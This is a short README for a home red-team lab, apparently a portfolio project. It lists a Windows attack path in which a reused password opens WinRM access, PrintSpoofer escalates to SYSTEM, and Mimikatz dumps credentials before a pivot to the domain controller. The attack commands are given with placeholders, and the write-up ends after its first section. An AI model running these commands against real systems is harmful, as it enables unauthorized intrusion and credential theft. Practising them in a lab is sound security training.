# Legend of Escalation: Red Team Privilege Escalation Lab

This project simulates a real-world red team attack path from initial foothold to full domain compromise in an Active Directory environment. The lab was built and executed manually using Windows Server 2019 (Domain Controller), Windows 10 (victim workstation), and Kali Linux (attacker).

## Objective

Gain a foothold on a Windows 10 machine via WinRM, escalate to SYSTEM using a privilege escalation exploit, dump credentials, and laterally move to compromise the domain controller.

---

## Lab Setup

### Attacker
- Kali Linux
- Tools used: Evil-WinRM, Mimikatz, Sliver C2, PrintSpoofer

### Victim Workstation
- Windows 10
- WinRM enabled and exposed (password reused)

### Domain Controller
- Windows Server 2019
- Running Active Directory

---

## Attack Path

### 1. Initial Access
- Used password reuse + exposed WinRM to gain access to a low-privileged user on the Windows 10 machine.
- Accessed the system using:
  ```bash
  evil-winrm -i <target-ip> -u <username> -p <password>
  whoami /priv
  .\PrintSpoofer64.exe -i -c cmd.exe
  mimikatz
privilege::debug
sekurlsa::logonpasswords
Used credentials to pivot and gain access to the domain controller.
